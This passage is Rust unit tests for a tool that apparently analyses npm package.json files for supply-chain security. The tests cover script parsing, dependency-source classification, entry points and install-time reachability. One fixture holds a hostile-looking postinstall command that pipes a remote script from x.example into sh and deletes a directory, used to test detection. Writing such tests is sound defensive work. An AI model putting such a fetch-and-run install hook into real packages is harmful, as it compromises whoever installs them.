    fn a_missing_script_is_reported() {
        let a = pkg(r#"{"scripts": {"a": "npm run nope"}}"#);
        assert_eq!(shell_texts(&a), vec!["run nope".to_string()]);
    }

    #[test]
    fn other_commands_are_reported_by_program_name() {
        let a = pkg(r#"{"scripts": {"postinstall": "curl -s https://x.example/i.sh | sh; rm -rf build"}}"#);
        assert_eq!(shell_texts(&a), vec!["curl".to_string(), "sh".to_string(), "rm".to_string()]);
    }

    #[test]
    fn built_at_run_time_is_reported() {
        for c in ["node $FILE", "node $(cat f)", "node `echo a.js`", "$CMD x", "node \"$DIR/a.js\""] {
            let a = pkg(&format!(r#"{{"scripts": {{"a": {}}}}}"#, serde_str(c)));
            assert!(!shell_texts(&a).is_empty(), "{c}");
            assert!(a.entries.iter().all(|w| w.label == "main"), "{c}: {:?}", a.entries);
        }
        let a = pkg(r#"{"scripts": {"a": "node a.js $(date)"}}"#);
        assert_eq!(shell_texts(&a), vec!["command substitution".to_string()]);
        assert!(wants(&a).contains(&s("scripts.a", "a.js", false)));
    }

    fn serde_str(c: &str) -> String {
        format!("\"{}\"", c.replace('\\', "\\\\").replace('"', "\\\""))
    }

    #[test]
    fn node_flags_and_preloads() {
        let a = pkg(r#"{"scripts": {"a": "node --max-old-space-size=4096 -r ./hook.js --require=./two.js app.js"}}"#);
        let w = wants(&a);
        for f in ["./hook.js", "./two.js", "app.js"] {
            assert!(w.contains(&s("scripts.a", f, false)), "{f}: {w:?}");
        }
        let a = pkg(r#"{"scripts": {"a": "node -e \"require('x')\"", "b": "node -r dotenv/config a.js"}}"#);
        assert_eq!(shell_texts(&a), vec!["node -e".to_string(), "node --require dotenv/config".to_string()]);
        assert!(wants(&a).contains(&s("scripts.b", "a.js", false)));
    }

    #[test]
    fn redirections_are_not_commands() {
        let a = pkg(r#"{"scripts": {"a": "node a.js > out.log 2>&1 && node b.js < in.txt"}}"#);
        assert!(shell_texts(&a).is_empty(), "{:?}", shell_texts(&a));
        let w = wants(&a);
        assert!(w.contains(&s("scripts.a", "a.js", false)) && w.contains(&s("scripts.a", "b.js", false)));
    }

    #[test]
    fn quotes_are_honoured_and_bad_syntax_is_reported() {
        let a = pkg(r#"{"scripts": {"a": "node \"a b.js\" 'x;y'"}}"#);
        assert!(wants(&a).contains(&s("scripts.a", "a b.js", false)));
        for c in ["node 'a.js", "(node a.js)", "cat <<EOF", "diff <(a) b"] {
            let a = pkg(&format!(r#"{{"scripts": {{"a": {}}}}}"#, serde_str(c)));
            assert_eq!(shell_texts(&a).len(), 1, "{c}: {:?}", shell_texts(&a));
        }
    }

    #[test]
    fn runners_collect_script_files() {
        let a = pkg(r#"{"scripts": {"a": "tsx watch src/main.ts", "b": "ts-node -r ./h.ts x.ts", "c": "bun run build", "build": "node b.js", "d": "deno run -A m.ts", "e": "bun test"}}"#);
        let w = wants(&a);
        assert!(w.contains(&s("scripts.a", "src/main.ts", false)));
        assert!(w.contains(&s("scripts.b", "./h.ts", false)) && w.contains(&s("scripts.b", "x.ts", false)));
        assert!(w.contains(&s("scripts.c", "b.js", false)));
        assert!(w.contains(&s("scripts.d", "m.ts", false)));
        assert_eq!(shell_texts(&a), vec!["bun".to_string()]);
    }

    #[test]
    fn package_managers_other_than_run_are_opaque() {
        let a = pkg(r#"{"scripts": {"a": "npm install", "b": "yarn add x", "c": "pnpm -r run build", "d": "npm --prefix web run x", "e": "npx tsc"}}"#);
        assert_eq!(
            shell_texts(&a),
            vec!["npm install", "yarn add", "pnpm -r", "npm --prefix", "npx"].into_iter().map(String::from).collect::<Vec<_>>()
        );
    }

    #[test]
    fn yarn_and_pnpm_shortcuts_run_scripts() {
        let a = pkg(r#"{"scripts": {"a": "yarn build", "build": "node b.js", "t": "pnpm test", "test": "node t.js", "s": "npm start", "start": "node s.js"}}"#);
        let w = wants(&a);
        assert!(w.contains(&s("scripts.a", "b.js", false)));
        assert!(w.contains(&s("scripts.t", "t.js", false)));
        assert!(w.contains(&s("scripts.s", "s.js", false)));
    }

    #[test]
    fn a_binding_gyp_without_an_install_script_runs_node_gyp_at_install() {
        let a = analyze_package(&RelPath::new("package.json").unwrap(), r#"{"scripts": {"test": "x"}}"#, true).unwrap();
        assert!(scripts(&a).contains(&("install".to_string(), ScriptTrigger::Install)));
        assert_eq!(shell_texts(&a), vec!["node-gyp rebuild".to_string(), "x".to_string()]);
        let a = analyze_package(&RelPath::new("package.json").unwrap(), r#"{"scripts": {"install": "node a.js"}}"#, true).unwrap();
        assert_eq!(scripts(&a).len(), 1);
        valid(&a);
    }

    #[test]
    fn dependencies_are_classified_by_where_they_come_from() {
        let a = pkg(r#"{
            "dependencies": {"a": "^1.2.3", "b": "latest", "c": "github:u/r", "d": "u/r#main", "e": "git+https://h/x.git",
                             "f": "https://h/t.tgz", "g": "https://github.com/u/r.git", "h": "file:../h", "i": "workspace:*",
                             "j": "npm:other@1", "k": "foo://x", "l": ">=1 <2", "m": "*", "n": "", "o": "~/x", "p": "git@h:u/r.git"},
            "devDependencies": {"z": "1"}, "optionalDependencies": {"y": "2"}, "peerDependencies": {"x": "3"}
        }"#);
        let d: BTreeMap<String, (DepSection, DependencySource)> = a
            .facts
            .iter()
            .filter_map(|f| f.dependency.as_ref().map(|i| (f.detail().unwrap().text().to_string(), (i.section, i.source))))
            .collect();
        use DependencySource::*;
        let src = |n: &str| d[n].1;
        assert_eq!(src("a"), Registry);
        assert_eq!(src("b"), Registry);
        assert_eq!(src("c"), Git);
        assert_eq!(src("d"), Git);
        assert_eq!(src("e"), Git);
        assert_eq!(src("f"), Url);
        assert_eq!(src("g"), Git);
        assert_eq!(src("h"), LocalPath);
        assert_eq!(src("i"), Workspace);
        assert_eq!(src("j"), Alias);
        assert_eq!(src("k"), Other);
        assert_eq!((src("l"), src("m"), src("n")), (Registry, Registry, Registry));
        assert_eq!((src("o"), src("p")), (LocalPath, Git));
        assert_eq!(d["z"].0, DepSection::Dev);
        assert_eq!(d["y"].0, DepSection::Optional);
        assert_eq!(d["x"].0, DepSection::Peer);
        valid(&a);
    }

    #[test]
    fn overrides_bundled_and_odd_values_are_facts() {
        let a = pkg(r#"{
            "overrides": {"foo": "github:u/r", "bar": {".": "1", "baz": "https://h/x.tgz"}},
            "resolutions": {"qux": "file:./q"},
            "pnpm": {"overrides": {"p": "git+ssh://h/p.git"}},
            "bundledDependencies": ["one", 2],
            "dependencies": {"bad": 5}
        }"#);
        let deps: Vec<(String, DependencySource)> = a
            .facts
            .iter()
            .filter_map(|f| f.dependency.as_ref().map(|i| (f.detail().unwrap().text().to_string(), i.source)))
            .collect();
        for (n, src) in [
            ("foo", DependencySource::Git),
            ("bar>.", DependencySource::Registry),
            ("bar>baz", DependencySource::Url),
            ("qux", DependencySource::LocalPath),
            ("p", DependencySource::Git),
            ("one", DependencySource::Bundled),
        ] {
            assert!(deps.contains(&(n.to_string(), src)), "{n}: {deps:?}");
        }
        assert_eq!(reasons(&a), vec![UnresolvedReason::UnsupportedSyntax; 2]);
        valid(&a);
    }

    #[test]
    fn entry_fields_are_collected() {
        let a = pkg(r#"{
            "main": "./lib/a.js", "module": "esm/a.mjs",
            "bin": {"tool": "bin/t.js", "other": "./o.js"},
            "exports": {".": {"import": "./esm.mjs", "require": "./cjs.cjs", "types": "./t.d.ts"}, "./sub": ["./s1.js", "./s2.js"], "./blocked": null, "./feat/*": "./f/*.js", "./bare": "pkg"}
        }"#);
        assert_eq!(
            wants(&a),
            vec![
                s("bin.other", "./o.js", false),
                s("bin.tool", "bin/t.js", false),
                s("exports...import", "./esm.mjs", false),
                s("exports...require", "./cjs.cjs", false),
                s("exports...types", "./t.d.ts", false),
                s("exports../sub", "./s1.js", false),
                s("exports../sub", "./s2.js", false),
                s("main", "./lib/a.js", false),
                s("module", "esm/a.mjs", false),
            ]
        );
        assert_eq!(reasons(&a), vec![UnresolvedReason::UnsupportedSyntax; 2], "the wildcard and the bare target");
    }

    #[test]
    fn a_package_with_no_main_guesses_index_js_quietly() {
        let a = pkg("{}");
        assert_eq!(a.entries.len(), 1);
        assert!(a.entries[0].optional);
        assert!(pkg(r#"{"main": "x.js"}"#).entries.iter().all(|w| !w.optional));
        assert!(pkg(r#"{"exports": "./x.js"}"#).entries.iter().all(|w| w.label != "main"));
    }

    #[test]
    fn directories_bin_is_reported() {
        let a = pkg(r#"{"directories": {"bin": "bin"}}"#);
        assert_eq!(reasons(&a), vec![UnresolvedReason::UnsupportedSyntax]);
    }

    #[test]
    fn facts_are_in_source_order() {
        let a = pkg(r#"{"scripts": {"b": "x", "a": "y"}, "dependencies": {"z": "1"}}"#);
        let starts: Vec<u32> = a.facts.iter().map(|f| f.at().start_byte).collect();
        let mut sorted = starts.clone();
        sorted.sort();
        assert_eq!(starts, sorted);
    }

    // ---- with the linker ----

    fn project(files: &[(&str, &str)], pkgs: &[(&str, &str)], extra: &[&str]) -> forge_analysis_schema::Linked {
        let rels: Vec<RelPath> = files.iter().map(|(p, _)| RelPath::new(p).unwrap()).collect();
        let infos: Vec<_> = files.iter().map(|(p, s)| info(p, s)).collect();
        let lf: Vec<LinkFile<'_>> = rels.iter().zip(&infos).map(|(path, info)| LinkFile { path, info }).collect();
        let mut all: BTreeSet<String> = files.iter().map(|(p, _)| p.to_string()).collect();
        all.extend(extra.iter().map(|s| s.to_string()));
        let mut wants = Vec::new();
        for (p, src) in pkgs {
            all.insert(p.to_string());
            wants.extend(analyze_package(&RelPath::new(p).unwrap(), src, false).unwrap().entries);
        }
        link_project(&lf, &all, &wants)
    }

    #[test]
    fn a_declared_main_replaces_the_roots_guess() {
        let l = project(
            &[("lib/a.js", "import './b.js';"), ("lib/b.js", "DEL;"), ("tool.js", "")],
            &[("package.json", r#"{"main": "lib/a.js"}"#)],
            &[],
        );
        assert_eq!(l.entry_basis, EntryBasis::Declared);
        assert_eq!(l.entries, vec![0]);
        let tool = l.fns.iter().find(|f| f.at.file == 2).unwrap();
        assert!(!tool.reachable_from_entry);
    }

    #[test]
    fn an_install_script_file_runs_in_the_install_lane() {
        let l = project(
            &[("setup.js", "DEL;"), ("lib.js", "")],
            &[("package.json", r#"{"main": "lib.js", "scripts": {"postinstall": "node setup.js"}}"#)],
            &[],
        );
        let setup = l.fns.iter().find(|f| f.at.file == 0 && f.at.func.0 == 0).unwrap();
        assert_eq!(setup.lanes, vec![Lane::Install]);
        assert_eq!(setup.transitive_effects, vec![Effect::FsDelete]);
        assert_eq!(l.install_entries, vec![0]);
        assert_eq!(l.entries, vec![1]);
    }

    #[test]
    fn a_file_loaded_by_the_install_script_inherits_the_install_lane() {
        let l = project(
            &[("setup.js", "require('./deep.js');"), ("deep.js", "DEL;")],
            &[("package.json", r#"{"scripts": {"postinstall": "node setup.js"}}"#)],
            &[],
        );
        let deep = l.fns.iter().find(|f| f.at.file == 1 && f.at.func.0 == 0).unwrap();
        assert!(deep.lanes.contains(&Lane::Install));
    }

    #[test]
    fn declared_entries_that_do_not_exist_are_reported_and_fall_back_to_roots() {
        let l = project(
            &[("src/x.js", "")],
            &[("package.json", r#"{"main": "dist/index.js", "bin": {"t": "bin/t.js"}}"#)],
            &["bin/t.js.map"],
        );
        assert_eq!(l.entry_basis, EntryBasis::Roots);
        assert_eq!(l.entries, vec![0]);
        let r: Vec<_> = l.entry_issues.iter().map(|i| (i.label.text().to_string(), i.reason)).collect();
        assert_eq!(r, vec![("bin.t".to_string(), UnlinkedReason::MissingFile), ("main".to_string(), UnlinkedReason::MissingFile)]);
    }

    #[test]
    fn the_default_index_js_is_used_when_present_and_silent_when_not() {
        let l = project(&[("index.js", "import './a.js';"), ("a.js", "")], &[("package.json", "{}")], &[]);
        assert_eq!(l.entry_basis, EntryBasis::Declared);
        assert!(l.entry_issues.is_empty());
        let l = project(&[("a.js", "")], &[("package.json", "{}")], &[]);
        assert_eq!(l.entry_basis, EntryBasis::Roots);
        assert!(l.entry_issues.is_empty());
    }

    #[test]
    fn packages_in_subfolders_resolve_relative_to_themselves() {
        let l = project(
            &[("pkg/src/m.js", ""), ("m.js", "")],
            &[("pkg/package.json", r#"{"main": "src/m.js"}"#)],
            &[],
        );
        assert_eq!(l.entries, vec![0]);
    }
}
